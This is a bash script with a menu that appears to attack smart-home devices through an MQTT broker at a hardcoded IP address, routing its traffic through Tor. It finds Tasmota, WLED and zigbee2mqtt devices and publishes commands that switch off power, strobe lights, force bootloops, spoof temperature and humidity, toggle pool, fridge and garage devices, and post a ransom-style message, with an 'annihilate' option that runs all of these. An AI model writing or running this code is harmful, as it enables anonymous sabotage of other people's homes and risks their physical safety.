#!/bin/bash
set -euo pipefail

HOST=82.22.173.161
PORT=1883
TOR=torsocks
MAX_TEMP=50
MAX_HUMID=99
MAX_BRIGHT=255

encrypt_payload() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k TRUSTEDF57 2>/dev/null | sed 's/=//g'
}

tor_pub() {
    $TOR mosquitto_pub -h $HOST -p $PORT -r -q 2 -t "$1" -m "$2" >/dev/null 2>&1
}

discover_all() {
    echo "[DISCOVERY] $HOST:$PORT"
    rm -f chaos_all.txt
    
    $TOR mosquitto_sub -h $HOST -p $PORT -t "#" -v | \
    timeout 45 head -n 5000 2>/dev/null | \
    grep -E 'Tasmota|wled|zigbee2mqtt|temp|humid|Garage|Garden|Shed|Pool|Fridge' | \
    sed 's|.*/||;s|/.*||' | \
    sort -u > chaos_all.txt
    
    COUNT=$(wc -l < chaos_all.txt 2>/dev/null || echo 0)
    echo "DEVICES: $COUNT"
    [[ $COUNT -gt 0 ]] && head -5 chaos_all.txt
    
    load_all
}

load_all() {
    ALL_DEVICES=()
    [[ -f chaos_all.txt && -s chaos_all.txt ]] && mapfile -t ALL_DEVICES < chaos_all.txt
}

check_loaded() {
    [[ ${#ALL_DEVICES[@]} -eq 0 ]] && { echo "DISCOVERY first"; sleep 2; return 1; }
}

show_devices() {
    [[ ${#ALL_DEVICES[@]} -eq 0 ]] && { echo "No devices"; return 1; }
    echo "DEVICES (${#ALL_DEVICES[@]}):"
    printf '%s\n' "${ALL_DEVICES[@]}" | head -10
}

max_temp_humidity() {
    check_loaded || return 1
    echo "TEMP/HUMIDITY MAX"
    tor_pub "zigbee2mqtt/#" '{"temp":50,"humid":99}'
    for dev in "${ALL_DEVICES[@]}"; do
        tor_pub "zigbee2mqtt/$dev" "50C 99%"
    done
    echo "DONE"
}

lights_strobe() {
    check_loaded || return 1
    echo "LIGHTS MAX"
    count=0
    for dev in "${ALL_DEVICES[@]}"; do
        tor_pub "$dev/Power" "1"
        tor_pub "$dev/Bri" "255"
        ((count++))
    done
    echo "$count LIGHTS"
}

power_off() {
    check_loaded || return 1
    echo "POWER OFF"
    for dev in "${ALL_DEVICES[@]}"; do
        tor_pub "$dev/Power" "0"
    done
    echo "OFF"
}

power_on() {
    check_loaded || return 1
    echo "POWER ON"
    for dev in "${ALL_DEVICES[@]}"; do
        tor_pub "$dev/Power" "1"
    done
    echo "ON"
}

disco() {
    check_loaded || return 1
    echo "DISCO"
    count=0
    for dev in "${ALL_DEVICES[@]}"; do
        [[ $dev == wled* ]] || continue
        tor_pub "wled/$dev" "fx38 bri255"
        ((count++))
    done
    echo "$count DISCO"
}

bootloop() {
    check_loaded || return 1
    echo "BOOTLOOP"
    count=0
    for dev in "${ALL_DEVICES[@]}"; do
        [[ $dev == Tasmota* ]] || continue
        tor_pub "Tasmota/$dev" "Power1;Delay400;Power0"
        ((count++))
    done
    echo "$count BOOT"
}

ransom() {
    crypt_data=$(encrypt_payload "CHAOS $MAX_TEMP $MAX_HUMID")
    tor_pub "\$SYS/brokers/$HOST" "TRUSTEDF57"
    tor_pub "zigbee2mqtt/bridge" "$crypt_data"
    echo "RANSOM"
}

pool_chaos() {
    check_loaded || return 1
    echo "POOL/VALVES"
    tor_pub "zigbee2mqtt/Pool" "ON"
    tor_pub "zigbee2mqtt/Fridge" "50C"
    tor_pub "Tasmota/Garage" "1"
    echo "VALVES"
}

annihilate() {
    check_loaded || return 1
    echo "ANNIHILATION"
    power_off; sleep 1
    max_temp_humidity; sleep 1
    power_on; sleep 1
    lights_strobe; sleep 1
    disco; sleep 1
    bootloop; sleep 1
    ransom; sleep 1
    pool_chaos
    echo "COMPLETE"
}

show_menu() {
    clear
    COUNT=${#ALL_DEVICES[@]}
    cat << EOF
TRUSTEDF57 $HOST:$PORT ($COUNT)
1) DISCOVER
2) TEMP MAX
3) LIGHTS
4) POWER OFF
5) POWER ON
6) DISCO
7) BOOTLOOP
8) RANSOM
9) POOL
0) ANNIHILATE
D) LIST
X) EXIT
EOF
}

ALL_DEVICES=()
while true; do
    show_menu
    read choice
    case "$choice" in
        1) discover_all ;;
        2) max_temp_humidity ;;
        3) lights_strobe ;;
        4) power_off ;;
        5) power_on ;;
        6) disco ;;
        7) bootloop ;;
        8) ransom ;;
        9) pool_chaos ;;
        0) annihilate ;;
        [Dd]) show_devices ;;
        [Xx]) exit 0 ;;
        *) echo "1=DISCOVER D=LIST" ;;
    esac
    read -p "ENTER..."
done
